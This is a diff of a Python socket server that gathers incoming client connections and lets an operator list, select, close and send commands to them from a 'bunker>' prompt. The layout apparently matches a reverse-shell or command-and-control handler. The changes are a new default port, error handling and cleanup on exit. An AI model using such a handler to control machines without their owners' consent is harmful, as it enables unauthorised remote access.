@@ -27,7 +27,7 @@ class MyServer:
         # self.queue = Queue()
         self.all_connections: List[Tuple[socket.socket, _RetAddress]] = []
 
-    def bind_and_listen(self, host="", port=9999):
+    def bind_and_listen(self, host="", port=55555):
         try:
 
             print(f"Binding socket to port: {port} and host: {host}")
@@ -57,7 +57,7 @@ class MyServer:
 
                 self.all_connections.append((con, add))
 
-                print(f"Accepted connection, IP: {add[0]}")
+                print(f"INFO: Accepted connection, IP: {add[0]}")
             except socket.error as e:
                 print(f"Error Accepting connection: {str(e)}")
 
@@ -96,22 +96,17 @@ class MyServer:
             results += str(i) + "@" + str(self.all_connections[i][1][0]) + ":" + str(
                 self.all_connections[i][1][1]) + "\n"
 
-        print("------------Clients------------\n" + results)
+        print("\n------------Clients------------\n" + results)
 
     def _get_target(self, i: int):
-        try:
-            con, add = self.all_connections[i]
-            print("Connected to: " + str(add[0]))
-            print(str(add[0] + ">"), end="")
-            return con
+        con, add = self.all_connections[i]
+        return con, add
 
-        except:
-            pass
 
     def start_bunker(self):
         while True:
 
-            cmd = input("bunker> ")
+            cmd = input("\nbunker> ")
 
             if cmd == "list":
                 self._list_connections()
@@ -119,15 +114,29 @@ class MyServer:
             elif "close" in cmd:
 
                 i = cmd.replace("close ", "")
-                con = self._get_target(int(i))
-                if con is not None:
-                    con.close()
+                i = int(i)
+
+                try:
+                
+                    con, add = self._get_target(i)
+                    if con is not None:
+                        con.close()
+                    del self.all_connections[i]
+                    print(f"Closed connection to {add}")
+                except socket.error:
+                    print("Error getting connection.")
 
             elif "select" in cmd:
                 i = cmd.replace("select ", "")
-                con = self._get_target(int(i))
-                if con is not None:
-                    self.__send_commands(con)
+                try:
+
+                    con,add = self._get_target(int(i))
+                    if con is not None:
+                        print(f"Connected to {add}")
+                        self.__send_commands(con)
+                except:
+                    print("Failed to select target.")
+
 
             elif cmd == "exit" or cmd == "quit":
                 for c in self.all_connections:
@@ -136,12 +145,15 @@ class MyServer:
 
                 del self.all_connections[:]
                 self.sock.close()
+                print("Closed all connections.")
+                print("You can close program now.")
                 sys.exit()
 
             else:
                 print("Command not recognized")
 
-def work(s : MyServer):
+
+def work(s: MyServer):
     while True:
         x = queue.get()
         if x == 1:
@@ -150,7 +162,6 @@ def work(s : MyServer):
         if x == 2:
             s.start_bunker()
 
-        
         queue.task_done()
 
 
@@ -159,6 +170,7 @@ def create_threads(s):
         t = threading.Thread(target=work, args=(s,))
         t.daemon = True
         t.start()
+
 
 def create_jobs():
     for x in JOB_NUMBER:
@@ -170,9 +182,18 @@ def main():
     s = MyServer()
     s.bind_and_listen()
 
-    create_threads(s)
-    create_jobs()
+    try:
+        create_threads(s)
+        create_jobs()
+    finally:
+        if s.all_connections != []:
+            for c in s.all_connections:
+                con, _ = c
+                con.close()
 
+            del s.all_connections[:]
+        s.sock.close()
+        return
 
 
 if __name__ == "__main__":
